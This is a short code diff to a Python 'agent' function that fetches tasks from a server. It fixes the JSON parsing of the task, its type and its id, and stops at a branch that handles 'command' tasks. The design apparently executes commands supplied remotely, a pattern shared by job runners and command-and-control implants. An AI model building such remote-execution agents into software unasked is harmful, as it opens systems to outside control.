@@ -18,13 +18,14 @@ def get_and_execute_task():
             print(f"[AGENT] Failed to fetch task: {response.status_code}")
             return
 
-        task = response.json()
-        if not task or task.get("task") is None:
+        response_json = response.json()
+        task = response_json.get("task")
+        if not task:
             print("[AGENT] No task received.")
             return
 
         print(f"[AGENT] Received task: {task}")
-        task_type = task.get("task_type")
+        task_type = task.get("type")
         task_id = task.get("task_id")
 
         if task_type == "command":
